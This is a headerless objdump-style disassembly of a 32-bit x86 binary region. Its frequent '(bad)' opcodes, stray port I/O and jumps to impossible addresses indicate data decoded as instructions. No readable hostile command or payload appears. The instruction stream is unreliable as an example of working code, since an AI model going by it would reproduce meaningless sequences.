  40ae93:	hlt    
  40ae94:	mov    BYTE PTR [ebp+eiz*2-0x14],ah
  40ae98:	(bad)  
  40ae99:	(bad)  
  40ae9a:	ret    0xe3b6
  40ae9d:	(bad)  
  40ae9e:	mov    ?,esp
  40aea0:	push   ebp
  40aea2:	rcl    eax,0xff
  40aea5:	call   0xc5fd86e7
  40aeaa:	data16 hlt 
  40aeac:	(bad)  
  40aead:	jmp    0xe9ce8df0
	...
  40aeda:	add    BYTE PTR [eax],al
  40aedc:	cmp    eax,0x955c835b
  40aee1:	in     al,dx
  40aee2:	(bad)  
  40aee3:	xchg   esi,eax
  40aee4:	cmp    eax,0x3d688464
  40aee9:	pop    ebx
  40aeea:	add    BYTE PTR [eax],al
  40aeec:	das    
  40aeed:	out    dx,eax
  40aeee:	(bad)  
  40aeef:	out    dx,al
  40aef0:	adc    DWORD PTR [ebx+0x24bf0875],ecx
  40aef6:	mov    al,0xff
  40aef8:	push   eax
  40aef9:	mov    esi,DWORD PTR [ebp-0x74e714]
  40aeff:	dec    DWORD PTR [edx-0x392f1910]
  40af05:	mov    edi,edi
  40af07:	dec    edx
  40af09:	nop
  40af0a:	idiv   edi
  40af0c:	add    BYTE PTR [ebx-0x6210f78b],cl
  40af12:	mov    cl,0xff
  40af14:	push   eax
  40af15:	mov    esi,DWORD PTR [ebp-0x74b71c]
  40af1b:	(bad)  
  40af1c:	(bad)  
  40af1e:	out    0xb4,al
  40af20:	push   ss
  40af21:	mov    edi,edi
  40af23:	dec    DWORD PTR [edx]
  40af25:	inc    esp
  40af26:	idiv   edi
  40af28:	xor    BYTE PTR [ebx+0x1c2f0875],cl
  40af2e:	mov    al,0xff
  40af30:	push   eax
  40af31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af32:	mov    ch,0xe0
  40af34:	dec    eax
  40af35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af36:	(bad)  
  40af37:	dec    edx
  40af39:	out    dx,eax
  40af3a:	out    0x98,al
  40af3c:	(bad)  
  40af3d:	mov    ds:0x83ff,eax
	...
  40af6a:	rol    BYTE PTR [esi-0x9],cl
  40af6d:	call   DWORD PTR [eax]
  40af6f:	pop    edi
  40af70:	je     0x40af8d
  40af72:	xchg   esp,eax
  40af73:	retf   0xf7cf
  40af76:	add    BYTE PTR [esp+eax*1-0x7a8f0a8b],ah
  40af7d:	fmul   st,st(0)
  40af7f:	mov    ds:0xa507ffff,eax
  40af84:	jne    0x40af8e
  40af86:	iret   
  40af87:	repnz scas eax,DWORD PTR es:[edi]
  40af89:	call   eax
  40af8b:	(bad)
  40af8f:	add    cl,BYTE PTR [esi+0x75]
  40af92:	ss (bad) 
  40af95:	mov    al,0xd9
  40af97:	fmul   QWORD PTR [esi-0x4b]
  40af9a:	fisubr DWORD PTR [edi+ecx*2-0x1]
  40af9e:	(bad)  
  40af9f:	cmp    eax,0x84c1ff98
  40afa4:	cdq    
  40afa5:	in     al,dx
  40afa6:	mov    cl,0x7c
  40afa8:	dec    edi
  40afa9:	call   0xff8f7dad
  40afae:	test   eax,0xa1f75bd6
  40afb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40afb4:	pop    esp
  40afb5:	rcr    BYTE PTR ss:[edi+ecx*2+0x57a1cbff],cl
  40afbd:	dec    DWORD PTR [ecx-0x7e4be467]
  40afc3:	inc    esp
  40afc4:	dec    edi
  40afc5:	mov    ch,0x96
  40afc7:	push   esp
  40afc8:	dec    edi
  40afc9:	jmp    DWORD PTR [esi+0x21]
  40afcc:	xchg   edi,eax
  40afcd:	inc    DWORD PTR [eax]
	...
  40aff7:	add    BYTE PTR [ecx+0x4c],ch
  40affa:	cdq    
  40affb:	lock imul esp,DWORD PTR [edi+ecx*2-0x18],0xff4f3633
  40b004:	push   ecx
  40b005:	mov    esi,0xee73e94a
  40b00a:	dec    ebp
  40b00b:	inc    DWORD PTR [ecx+0x6e]
  40b00e:	dec    edi
  40b00f:	call   0x439483
  40b014:	pop    es
  40b015:	(bad)  
  40b016:	cli    
  40b017:	call   DWORD PTR [edx-0x57ca083]
  40b01d:	and    cl,bl
  40b01f:	jmp    DWORD PTR [edi+0x46754de7]
  40b025:	or     al,0x26
  40b027:	mov    cl,0x9
  40b029:	stos   BYTE PTR es:[edi],al
  40b02a:	jnp    0x40b071
  40b02c:	add    bl,BYTE PTR [ebp+0x5b7f5808]
  40b032:	jmp    0x91a41b85
  40b037:	shr    dl,1
  40b039:	repnz xchg ebp,eax
  40b03b:	dec    esi
  40b03c:	imul   ebp,edi,0xffffff8d
  40b03f:	fadd   DWORD PTR [ecx+0x3]
  40b042:	sbb    edx,DWORD PTR [ebp+0x41aff2d1]
  40b048:	inc    edx
  40b049:	pop    ebx
  40b04a:	sbb    al,0x7b
  40b04c:	rcr    ah,cl
  40b04e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b04f:	aas    
  40b050:	mov    cl,0xf2
  40b052:	gs cmp bl,0xee
  40b056:	mov    eax,0x565f334e
  40b05b:	sbb    BYTE PTR [eax],al
	...
  40b085:	add    BYTE PTR [ebp-0x5d],bh
  40b088:	test   al,0x3
  40b08a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b08b:	cli    
  40b08c:	add    edi,DWORD PTR gs:[esi]
  40b08f:	sub    si,di
  40b092:	ret    0xeb92
  40b095:	add    edi,DWORD PTR [esi]
  40b097:	sbb    ah,BYTE PTR [ebx+ecx*2+0x3e95b3e]
  40b09e:	jns    0x40b038
  40b0a0:	adc    eax,0xe95b414e
  40b0a5:	fldenv [ecx-0x7c]
  40b0a8:	jmp    0xe9c50a86
  40b0ad:	cmp    bl,0xe6
  40b0b0:	cwde   
  40b0b1:	add    bl,0xe7
  40b0b4:	std    
  40b0b5:	dec    ebp
  40b0b6:	inc    ecx
  40b0b7:	mov    ebp,esi
  40b0b9:	xlat   BYTE PTR ds:[ebx]
  40b0ba:	xor    edx,esi
  40b0bc:	pop    ebx
  40b0bd:	push   eax
  40b0be:	es mov ah,0x7d
  40b0c1:	add    al,0x3e
  40b0c3:	test   ax,0x3ad8
  40b0c7:	add    al,0xb
  40b0c9:	add    bh,BYTE PTR [esi]
  40b0cb:	pop    ebx
  40b0cc:	push   ecx
  40b0cd:	ins    DWORD PTR es:[edi],dx
  40b0ce:	xchg   BYTE PTR [ecx+ebp*8+0x5f934c],bl
  40b0d5:	rol    DWORD PTR [ecx+ebp*4],0xfe
  40b0d9:	scas   al,BYTE PTR es:[edi]
  40b0da:	ja     0x40b0e7
  40b0dc:	lea    ebp,[esi+edx*4-0x16]
  40b0e0:	(bad)  
  40b0e1:	sahf   
  40b0e2:	mov    dl,0x8b
  40b0e4:	call   0xff327c0f
  40b0e9:	pusha  
	...
  40b112:	add    BYTE PTR [eax],al
  40b114:	shr    edx,0xf6
  40b117:	xchg   BYTE PTR [ebx+0x73ad84e0],al
  40b11d:	repnz (bad) 
  40b11f:	sbb    edx,esp
  40b121:	mov    ch,0x57
  40b123:	sub    BYTE PTR [edx-0xe],al
  40b126:	mov    ah,0x59
  40b128:	or     esi,edx
  40b12a:	(bad)  
  40b12b:	pop    esi
  40b12c:	push   ecx
  40b12d:	push   ds
  40b12e:	dec    eax
  40b12f:	test   al,0x3d
  40b131:	add    edx,DWORD PTR [ecx-0x69]
  40b134:	or     esi,edx
  40b136:	mov    BYTE PTR [esi+eiz*1-0x16],ch
  40b13a:	(bad)  
  40b13b:	ds fs icebp 
  40b13e:	sbb    dx,dx
  40b141:	call   0x26f6:0xead12e00
  40b148:	add    esi,edx
  40b14a:	xor    al,0x2a
  40b14c:	stos   BYTE PTR es:[edi],al
  40b14d:	call   0xefe:0xa94f0100
  40b154:	aad    0xd7
  40b156:	jmp    0x40b156
  40b158:	add    dh,dl
  40b15a:	imul   ebp,ecx,0xa8580865
  40b160:	cmp    eax,0x92f9b4f2
  40b165:	lock (bad) 
  40b167:	out    0x48,al
  40b169:	sbb    al,0x48
  40b16b:	sub    BYTE PTR [edx+0x3],al
  40b16e:	adc    eax,0x88f0729f
  40b173:	fs jne 0x40b15e
  40b176:	inc    BYTE PTR [eax]
	...
  40b1a0:	add    BYTE PTR [eax],al
  40b1a2:	clc    
  40b1a3:	adc    bh,bh
  40b1a5:	addr16 cmc 
  40b1a7:	les    edi,FWORD PTR [edi]
  40b1a9:	add    al,cl
  40b1ab:	leave  
  40b1ac:	out    dx,eax
  40b1ad:	imul   DWORD PTR [eax-0x5bca0061]
  40b1b3:	mov    ah,0x3f
  40b1b5:	add    bh,cl
  40b1b7:	xchg   DWORD PTR [ebp-0x7a8a3701],esi
  40b1bd:	loopne 0x40b16f
  40b1bf:	lahf   
  40b1c0:	dec    DWORD PTR [ebp-0x8bb9e]
  40b1c6:	dec    eax
  40b1c7:	lods   al,BYTE PTR ds:[esi]
  40b1c8:	data16 (bad) [edi]
  40b1cb:	sbb    al,0xff
  40b1cd:	(bad)  
  40b1ce:	jb     0x40b15c
  40b1d0:	idiv   edi
  40b1d2:	sbb    BYTE PTR [edi+0x1defc335],bl
  40b1d8:	jmp    edi
  40b1da:	arpl   cx,cx
  40b1dc:	(bad)  
  40b1dd:	call   FWORD PTR [esp+ebx*4-0x1edbec8c]
  40b1e4:	xlat   BYTE PTR ds:[ebx]
  40b1e5:	test   DWORD PTR [eax-0x61],0x9f9d7504
  40b1ec:	xor    BYTE PTR [edi-0x8c01e],cl
  40b1f2:	sbb    BYTE PTR [ebx+0x3fe2c70a],dl
  40b1f8:	idiv   edi
  40b1fa:	dec    eax
  40b1fb:	jmp    0xaca8b1fe
  40b200:	out    0x95,al
  40b202:	adc    eax,0x8dff9f
	...
  40b22f:	add    dl,ah
  40b231:	sub    esi,edi
  40b233:	dec    DWORD PTR [eax-0x53]
  40b236:	(bad)
  40b23a:	(bad)  
  40b23b:	(bad)  
  40b23c:	rol    BYTE PTR [esi-0x5bf70009],cl
  40b242:	xor    eax,0xc53a3ec3
  40b247:	jmp    DWORD PTR [ecx]
  40b249:	jb     0x40b1dc
  40b24b:	call   DWORD PTR [ecx]
  40b24d:	in     eax,dx
  40b24e:	inc    edx
  40b24f:	je     0x40b27e
  40b251:	test   DWORD PTR [ecx+0x4aa909d0],ecx
  40b257:	add    al,0x73
  40b259:	cld    
  40b25a:	dec    ecx
  40b25b:	xor    cl,al
  40b25d:	jle    0x40b28f
  40b25f:	imul   ecx
  40b261:	rcr    BYTE PTR [esi+0xa],1
  40b264:	stc    
  40b265:	jle    0x40b297
  40b267:	neg    ecx
  40b269:	loopne 0x40b26e
  40b26b:	add    BYTE PTR [esi],bh
  40b26d:	add    dh,BYTE PTR [ebx+0x4b346fe7]
  40b273:	(bad)  
  40b274:	mov    ebp,0xb9f76026
  40b279:	add    BYTE PTR [esp+esi*2],0x71
  40b27d:	test   DWORD PTR [ecx+0x4b90b1d4],ecx
  40b283:	add    ch,BYTE PTR [ebx]
  40b285:	push   eax
  40b286:	fdivp  st(7),st
  40b288:	retf   0x3876
  40b28b:	not    DWORD PTR [ecx-0x2c014b68]
  40b291:	xchg   ebp,eax
  40b292:	push   ebx
  40b293:	inc    DWORD PTR [eax]
	...
  40b2bd:	add    BYTE PTR [ecx+0x79db9c99],al
  40b2c3:	inc    eax
  40b2c4:	(bad)  
  40b2c5:	mov    edi,0xbd85eaea
  40b2ca:	jp     0x40b314
  40b2cc:	dec    ebx
  40b2cd:	(bad)  
  40b2ce:	ds iret 
  40b2d0:	out    dx,eax
  40b2d1:	(bad)  
  40b2d2:	xchg   ebx,eax
  40b2d3:	push   ebp
  40b2d4:	push   ebx
  40b2d5:	call   DWORD PTR [ecx+0x49]
  40b2d8:	div    DWORD PTR [ecx-0x7abe0fb7]
  40b2de:	pop    edx
  40b2df:	lock dec ecx
  40b2e1:	(bad)  
  40b2e2:	ds add al,0x3
  40b2e5:	add    BYTE PTR [ebp+0x315fa45b],bh
  40b2eb:	out    dx,eax
  40b2ec:	fld    QWORD PTR [ebx]
  40b2ee:	stos   BYTE PTR es:[edi],al
  40b2ef:	sub    BYTE PTR [edx-0x78],0x2a
  40b2f3:	out    0xcd,eax
  40b2f5:	dec    edx
  40b2f6:	ds addr16 dec ebx
  40b2f9:	xchg   ebx,ecx
  40b2fb:	add    esi,DWORD PTR [esi+0x3d5c014a]
  40b301:	lods   eax,DWORD PTR ds:[esi]
  40b302:	popa   
  40b303:	pop    ecx
  40b304:	jmp    0x1c2f6363
  40b309:	cld    
  40b30a:	loope  0x40b2d5
  40b30c:	dec    esi
  40b30d:	dec    edx
  40b30e:	loope  0x40b2fe
  40b310:	pop    ebx
  40b311:	push   edi
  40b312:	shr    esi,1
  40b314:	lea    ecx,[edx+0x4b]
  40b317:	arpl   WORD PTR [ecx+0x7dee9861],dx
  40b31d:	dec    edx
  40b31e:	mov    eax,DWORD PTR [ebx]
  40b320:	jle    0x40b36c
	...
  40b34a:	add    BYTE PTR [eax],al
  40b34c:	mov    ecx,0x99fbf3ee
  40b351:	adc    edx,DWORD PTR [edi-0x6c1156b6]
  40b357:	aaa    
  40b358:	test   eax,0xd34a55ee
  40b35d:	not    DWORD PTR [ebp+0x4a]
  40b360:	xchg   ecx,eax
  40b361:	out    dx,al
  40b362:	mov    ebx,0x8ed3a1fb
  40b367:	dec    edx
  40b368:	sub    esi,0xee71277b
  40b36e:	sub    eax,0x1162eb4a
  40b373:	scas   eax,DWORD PTR es:[edi]
  40b374:	fwait
  40b375:	out    dx,al
  40b376:	sbb    eax,0x1dfbab4a
  40b37b:	dec    edx
  40b37c:	pop    ecx
  40b37d:	out    dx,al
  40b37e:	xchg   ebx,eax
  40b37f:	sti    
  40b380:	pop    ecx
  40b381:	ret    
  40b382:	push   esi
  40b383:	dec    edx
  40b384:	dec    ecx
  40b385:	out    dx,al
  40b386:	xor    ebx,DWORD PTR [edi+0x49]
  40b389:	out    dx,al
  40b38a:	push   ebp
  40b38c:	xchg   esp,eax
  40b38d:	loope  0x40b33f
  40b38f:	out    dx,al
  40b390:	xchg   esi,ebp
  40b392:	mov    ah,0xd5
  40b394:	(bad)  
  40b395:	out    dx,al
  40b396:	(bad)  
  40b397:	shl    edi,1
  40b399:	stos   BYTE PTR es:[edi],al
  40b39a:	(bad)  
  40b39b:	(bad)  
  40b39c:	xchg   DWORD PTR [eax-0x11782919],ebp
  40b3a2:	out    0x3d,eax
  40b3a4:	lods   eax,DWORD PTR ds:[esi]
  40b3a5:	in     eax,dx
  40b3a6:	(bad)  
  40b3a7:	mov    esi,0xb6f6fab1
  40b3ac:	xchg   DWORD PTR [ebx],eax
  40b3ae:	imul   edi,DWORD PTR [eax+0x0],0x0
	...
  40b3d9:	add    BYTE PTR [edi-0x6da30112],al
  40b3df:	out    0xfe,al
  40b3e1:	sahf   
  40b3e2:	or     BYTE PTR [ebp-0x1178694f],0x44
  40b3e9:	xchg   ecx,eax
  40b3ea:	jne    0x40b397
  40b3ec:	cld    
  40b3ed:	xchg   BYTE PTR [edi-0x12],dh
  40b3f0:	je     0x40b46f
  40b3f2:	bound  esi,QWORD PTR [ecx-0x63]
  40b3f5:	jmp    0xe202d837
  40b3fa:	cmp    eax,0xc3558b88
  40b3ff:	push   ss
  40b400:	hlt    
  40b401:	sar    DWORD PTR ds:0x89560e81,cl
  40b407:	push   ebp
  40b408:	call   0xff2e6be6
  40b40d:	jo     0x40b3d8
  40b40f:	icebp  
  40b410:	addr16 jmp 0xc1feb253
  40b416:	inc    edi
  40b417:	xchg   ebx,eax
  40b418:	inc    ecx
  40b419:	jmp    0xa89954b3
  40b41e:	cmp    eax,0x5f174ee
  40b423:	xchg   edx,eax
  40b424:	ficom  DWORD PTR [esi]
  40b426:	pop    es
  40b427:	loopne 0x40b46d
  40b429:	adc    DWORD PTR [edx-0x60ff6a8b],ecx
  40b42f:	sbb    bh,bh
  40b431:	addr16 sahf 
  40b433:	sar    DWORD PTR [edi],0x0
  40b436:	xor    BYTE PTR [esi-0x3d],bl
  40b439:	dec    eax
  40b43a:	out    0x58,al
  40b43c:	call   0x40b45e
	...
  40b465:	add    BYTE PTR [eax],al
  40b467:	add    bl,cl
  40b469:	mov    ds:0x1cd70bff,eax
  40b46e:	and    eax,0x688b6a89
  40b473:	add    DWORD PTR [edi],esp
  40b475:	xchg   esp,eax
  40b476:	mov    esi,0xe6ef4aff
  40b47b:	mov    ds:0xffffa3b2,al
  40b480:	cmp    bl,BYTE PTR [edi-0x5c548a01]
  40b486:	jne    0x40b490
  40b488:	iret   
  40b489:	lods   eax,DWORD PTR cs:[esi]
  40b48b:	inc    eax
  40b48d:	mov    ds:0x3fbff475,eax
  40b492:	mov    al,0xff
  40b494:	rcl    BYTE PTR [eax],0x9c
  40b497:	pop    eax
  40b498:	push   ss
  40b499:	push   edi
  40b49a:	push   DWORD PTR [ebp-0x31]
  40b49d:	nop
  40b49e:	(bad)  
  40b49f:	cld    
  40b4a0:	xor    BYTE PTR [ebx-0x5cdc8a01],ah
  40b4a6:	jne    0x40b4b0
  40b4a8:	nop    DWORD PTR [ebp-0x3dceff01]
  40b4af:	add    al,0xa7
  40b4b1:	mov    ebp,0x2c24ec89
  40b4b6:	cld    
  40b4b7:	push   0xffffff97
  40b4b9:	push   cs
  40b4ba:	push   cs
  40b4bb:	dec    edx
  40b4bd:	lock out 0xe5,al
  40b4c0:	ret    0xffa3
  40b4c3:	mov    DWORD PTR [edx+0x57006894],ebx
  40b4c9:	xchg   ebx,eax
  40b4ca:	mov    esi,0x68
	...
  40b4f3:	add    BYTE PTR [eax],al
  40b4f5:	add    BYTE PTR [ecx],dh
  40b4f7:	sar    BYTE PTR [edi],0x0
  40b4fa:	fimul  DWORD PTR ds:[eax+ebx*2-0x1]
  40b4ff:	add    DWORD PTR [eax+0x75],ecx
  40b502:	ss dec edx
  40b504:	xor    ebx,ecx
  40b506:	inc    ecx
  40b507:	in     eax,dx
  40b508:	inc    esi
  40b509:	jne    0x40b545
  40b50b:	in     eax,0xcc
  40b50d:	pop    es
  40b50e:	es hlt 
  40b510:	cwde   
  40b511:	jmp    FWORD PTR [ecx]
  40b513:	stos   DWORD PTR es:[edi],eax
  40b514:	inc    ecx
  40b515:	add    al,0x3e
  40b517:	daa    
  40b518:	jnp    0x40b506
  40b51a:	mov    ebp,0x3e6a47bd
  40b51f:	cwde   
  40b520:	hlt    
  40b521:	(bad)  
  40b522:	xchg   ebx,eax
  40b523:	jmp    0x8946:0xacd3aa5a
  40b52a:	and    DWORD PTR [esi-0x530e0025],0xffffff85
  40b531:	push   0xffc59b42
  40b536:	pop    ecx
  40b537:	jmp    0x40b4e4
  40b539:	inc    eax
  40b53a:	(bad)
  40b53e:	out    0x66,al
  40b540:	sub    eax,0x447c9ff
  40b545:	push   0xffc53b78
  40b54a:	and    DWORD PTR [esi],edx
  40b54c:	lods   al,BYTE PTR ds:[esi]
  40b54d:	inc    eax
  40b54e:	ds jge 0x40b562
  40b551:	ret    
  40b552:	test   dl,0x2
  40b555:	call   0xff878661
	...
  40b582:	add    BYTE PTR [eax],al
  40b584:	inc    ebp
  40b585:	inc    edx
  40b586:	shl    BYTE PTR [ebx],1
  40b588:	es pusha 
  40b58a:	lods   eax,DWORD PTR ds:[esi]
  40b58b:	inc    eax
  40b58c:	rcr    BYTE PTR ds:[edx+0x25],cl
  40b590:	retf   0x472c
  40b593:	push   eax
  40b594:	out    0x1,al
  40b596:	add    ebp,edi
  40b598:	mov    al,0x19
  40b59a:	call   FWORD PTR [eax-0x1]
  40b59d:	pop    edx
  40b59e:	jmp    0xf1a61656
  40b5a3:	pop    ebx
  40b5a4:	adc    dl,BYTE PTR cs:[esi]
  40b5a7:	inc    edi
  40b5a8:	push   cx
  40b5aa:	pop    ecx
  40b5ab:	inc    edi
  40b5ac:	dec    ecx
  40b5ad:	jmp    0x40b62a
  40b5af:	inc    edi
  40b5b0:	inc    ecx
  40b5b1:	gs icebp 
  40b5b3:	pop    ebx
  40b5b4:	retf   0xf5b8
  40b5b7:	inc    esi
  40b5b8:	pop    es
  40b5b9:	push   ds
  40b5ba:	in     eax,0x3
  40b5bc:	xchg   ebx,eax
  40b5bd:	(bad)  
  40b5be:	aam    0x82
  40b5c0:	cli    
  40b5c1:	out    0x36,eax
  40b5c3:	scas   eax,DWORD PTR es:[edi]
  40b5c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b5c5:	pop    ebx
  40b5c6:	inc    ebx
  40b5c7:	cmc    
  40b5c8:	adc    BYTE PTR [ecx-0x1f],dh
  40b5cb:	pop    ebx
  40b5cc:	pop    eax
  40b5cd:	mov    eax,0xa0b746c5
  40b5d2:	mov    ebp,0x21a2337a
  40b5d7:	vpmullw xmm5,xmm1,xmm3
  40b5db:	mov    edx,0x83e99c81
  40b5e0:	and    DWORD PTR [ebx+0x15],ebx
  40b5e3:	mov    ebx,0xc5308d61
	...
  40b610:	add    BYTE PTR [eax],al
  40b612:	rcl    DWORD PTR [ecx+0x5ba5ba81],1
  40b618:	jmp    0xc4b03817
  40b61d:	lods   eax,DWORD PTR ds:[esi]
  40b61e:	mov    eax,ds:0xb1462fca
  40b623:	jae    0x40b637
  40b625:	lods   eax,DWORD PTR ds:[esi]
  40b626:	(bad)  
  40b627:	pop    edx
  40b628:	mov    ecx,0x5daeeb5b
  40b62d:	inc    esi
  40b62e:	out    dx,al
  40b62f:	jb     0x40b61a
  40b631:	add    esp,DWORD PTR [ecx+0x1346b8a9]
  40b637:	push   ebx
  40b638:	push   ecx
  40b639:	inc    ebx
  40b63a:	imul   ebp,edx,0x3d
  40b63d:	pop    ebx
  40b63e:	test   al,0xba
  40b640:	push   DWORD PTR ds:0xa700f5f8
  40b646:	mov    ebp,0xf79c0029
  40b64b:	mov    al,ds:0xa3fddafc
  40b650:	(bad)  
  40b651:	push   ss
  40b652:	clc    
  40b653:	jmp    0x6275f649
  40b658:	jne    0x40b696
  40b65a:	clc    
  40b65b:	outs   dx,DWORD PTR ds:[esi]
  40b65c:	cld    
  40b65d:	dec    BYTE PTR [ecx]
  40b65f:	(bad)  
  40b660:	call   0xff2a8d48
  40b665:	mov    fs,ebx
  40b667:	adc    al,dl
  40b669:	in     eax,dx
  40b66a:	cmp    eax,0xbfcd8b90
  40b66f:	push   ds
  40b670:	cld    
  40b671:	inc    ebx
  40b672:	cmp    dh,BYTE PTR [ebp+0x12]
  40b675:	into   
	...
  40b69e:	add    BYTE PTR [eax],al
  40b6a0:	stc    
  40b6a1:	popa   
  40b6a2:	call   0xff2a5d3c
  40b6a7:	jo     0x40b662
  40b6a9:	in     eax,0x67
  40b6ab:	jmp    0x41feb0ed
  40b6b0:	adc    eax,DWORD PTR [ebx-0x7ffa16bf]
  40b6b6:	pop    ecx
  40b6b7:	sub    BYTE PTR [edx-0x16],al
  40b6ba:	je     0x40b69d
  40b6bc:	jne    0x40b690
  40b6be:	xlat   BYTE PTR ds:[ebx]
  40b6bf:	mov    es,WORD PTR [ebx+0x7b8574ea]
  40b6c5:	jo     0x40b6cf
  40b6c7:	xchg   ecx,eax
  40b6c8:	jno    0x40b681
  40b6ca:	(bad)  
  40b6cb:	jbe    0x40b742
  40b6cd:	sbb    eax,0xd4d8e904
  40b6d2:	jmp    0x40b73c
  40b6d4:	inc    BYTE PTR [esi]
  40b6d6:	neg    DWORD PTR [esi+0x3]
  40b6d9:	fadd   DWORD PTR [ebp+edx*2-0x36]
  40b6dd:	call   0x30439456
  40b6e2:	ret    
  40b6e3:	add    bh,cl
  40b6e5:	sbb    al,0xff
  40b6e7:	out    0x85,eax
  40b6e9:	jb     0x40b6eb
  40b6eb:	add    BYTE PTR [ebp+ebx*4+0xf],bl
  40b6ef:	test   DWORD PTR [esi+0x1000005d],esi
  40b6f5:	stos   BYTE PTR es:[edi],al
  40b6f6:	test   BYTE PTR [eax],0x67
  40b6f9:	pop    ebp
  40b6fa:	add    bh,al
  40b6fc:	mov    ds:0x5707ff99,al
  40b701:	pop    ebp
  40b702:	push   0x0
	...
  40b72c:	add    BYTE PTR [eax],al
  40b72e:	lods   eax,DWORD PTR ds:[esi]
  40b72f:	pop    ebp
  40b730:	push   0x0
  40b732:	int    0x5c
  40b734:	lea    eax,[ebp+0x33]
  40b737:	lods   eax,DWORD PTR ds:[esi]
  40b738:	mov    eax,DWORD PTR [ebp-0x67cd]
  40b73e:	addr16 sahf 
  40b740:	jne    0x40b73a
  40b742:	clc    
  40b743:	sbb    ebx,edi
  40b745:	call   0x41297d
  40b74a:	sbb    al,0x9d
  40b74c:	je     0x40b753
  40b74e:	out    dx,al
  40b74f:	or     BYTE PTR [eax],al
  40b751:	add    bh,ah
  40b753:	add    al,0x9e
  40b755:	dec    eax
  40b756:	es pop edi
  40b758:	push   DWORD PTR [ebp+0xb]
  40b75b:	test   DWORD PTR [ebp+0x509f98b2],eax
  40b761:	mov    edx,DWORD PTR [edi-0x4f0b7a8f]
  40b767:	lahf   
  40b768:	call   DWORD PTR [eax+0x5]
  40b76b:	xchg   DWORD PTR [ebp-0x4e],esi
  40b76e:	mov    eax,0x3785899f
  40b773:	xchg   edi,eax
  40b774:	(bad)  
  40b775:	(bad)  
  40b776:	mov    edi,0x18ffae23
  40b77b:	add    bh,bh
  40b77d:	sub    esi,DWORD PTR [di+0x3f]
  40b782:	clc    
  40b783:	fsubr  st,st(7)
  40b785:	idiv   DWORD PTR [esi]
  40b787:	xchg   ecx,eax
  40b788:	inc    esp
  40b789:	call   DWORD PTR [ebx+0x35]
  40b78c:	mov    ebx,0x388a3e40
  40b791:	mov    cl,0x0
	...
  40b7bb:	add    BYTE PTR [ecx+0x29],bh
  40b7be:	jp     0x40b745
  40b7c0:	pop    edx
  40b7c1:	sub    DWORD PTR [edi+edi*8-0x2c],eax
  40b7c5:	icebp  
  40b7c6:	fidivr DWORD PTR [ebx+0x7]
  40b7c9:	mov    bl,0x2
  40b7cb:	call   DWORD PTR [ebx+0x51ff4c42]
  40b7d1:	push   ecx
  40b7d2:	push   cs
  40b7d3:	ret    
  40b7d4:	div    BYTE PTR [edx+0x2393e802]
  40b7da:	inc    esp
  40b7db:	inc    edi
  40b7dd:	jle    0x40b836
  40b7df:	div    DWORD PTR [ecx]
  40b7e1:	icebp  
  40b7e2:	xlat   BYTE PTR ds:[ebx]
  40b7e3:	jmp    DWORD PTR [ecx+0x3e40aa75]
  40b7e9:	add    DWORD PTR [ecx-0x10],edi
  40b7ec:	adc    DWORD PTR [ecx],ecx
  40b7ee:	inc    ebx
  40b7ef:	dec    DWORD PTR [ebx-0x4b]
  40b7f2:	retf   
  40b7f3:	inc    eax
  40b7f4:	sbb    dl,BYTE PTR ds:[ebx-0x72defe4f]
  40b7fb:	test   esi,esp
  40b7fd:	mov    al,0x42
  40b7ff:	inc    ebx
  40b801:	jbe    0x40b863
  40b803:	imul   ecx
  40b805:	mov    eax,0x9acb67d3
  40b80a:	(bad)  
  40b80d:	mov    ?,WORD PTR [edi+esi*8]
  40b810:	rcl    eax,1
  40b812:	inc    edx
  40b813:	xor    eax,0xffc539fd
  40b818:	(bad)  [ebp+0x75]
  40b81b:	(bad)  
  40b81c:	mov    ecx,0x7442ec
	...
  40b849:	add    BYTE PTR [edi+0x75],dl
  40b84c:	sbb    esp,0x44378b1
  40b852:	sub    ebx,DWORD PTR [ebx-0x7]
  40b855:	inc    edx
  40b856:	dec    esi
  40b857:	fsub   DWORD PTR [ebx+0x24]
  40b85a:	mov    edi,esp
  40b85c:	push   ebp
  40b85d:	aam    0xa1
  40b85f:	and    DWORD PTR [edi+0x43],edi
  40b862:	xor    ebx,0x6e7e0edc
  40b868:	out    0xd3,eax
  40b86a:	pop    ecx
  40b86b:	xor    eax,0x1f694387
  40b870:	fs and al,0x69
  40b873:	out    0x25,eax
  40b875:	sbb    DWORD PTR [esi],edi
  40b877:	pop    ebx
  40b878:	jmp    0x1e3f4c03
  40b87d:	inc    ebx
  40b87e:	dec    ecx
  40b87f:	pop    edx
  40b880:	xchg   ebp,eax
  40b881:	fidivr DWORD PTR [ebp+eiz*4-0x18c6c4ec]
  40b888:	call   0x341b3c44
  40b88d:	sub    al,0x31
  40b88f:	out    0xed,eax
  40b891:	add    ebp,DWORD PTR [edx+0x3e0451a0]
  40b897:	neg    BYTE PTR [esi-0x3eac74be]
  40b89d:	outs   dx,DWORD PTR ds:[esi]
  40b89e:	aam    0xe6
  40b8a0:	int    0x42
  40b8a2:	retf   
  40b8a3:	idiv   DWORD PTR [ebp+0x33e6f942]
  40b8a9:	or     al,0xe6
  40b8ab:	pop    ebx
  40b8ac:	add    BYTE PTR [edx+0x0],0x0
	...
  40b8d8:	jmp    0xe96c2cc3
  40b8dd:	out    0xa5,al
  40b8df:	inc    edx
  40b8e0:	push   ebx
  40b8e1:	push   ebx
  40b8e2:	xchg   ecx,eax
  40b8e3:	xor    eax,0x4295e6a4
  40b8e8:	xchg   ebx,eax
  40b8e9:	call   DWORD PTR [ebp-0x4193ebe]
  40b8ef:	or     esp,DWORD PTR [esi-0x4ebdad01]
  40b8f5:	out    0xff,al
  40b8f7:	cmp    ebx,DWORD PTR [ebp-0x12]
  40b8fa:	(bad)  
  40b8fb:	outs   dx,BYTE PTR ds:[esi]
  40b8fc:	cld    
  40b8fd:	outs   dx,DWORD PTR ds:[esi]
  40b8fe:	or     BYTE PTR [ecx-0x2f],dl
  40b901:	mov    ah,0xfe
  40b903:	pop    esi
  40b904:	cld    
  40b905:	scas   eax,DWORD PTR es:[edi]
  40b906:	jecxz  0x40b966
  40b908:	cld    
  40b909:	in     eax,0xe7
  40b90b:	xchg   ecx,eax
  40b90c:	push   cs
  40b90d:	out    0xfe,al
  40b90f:	inc    esi
  40b910:	div    dh
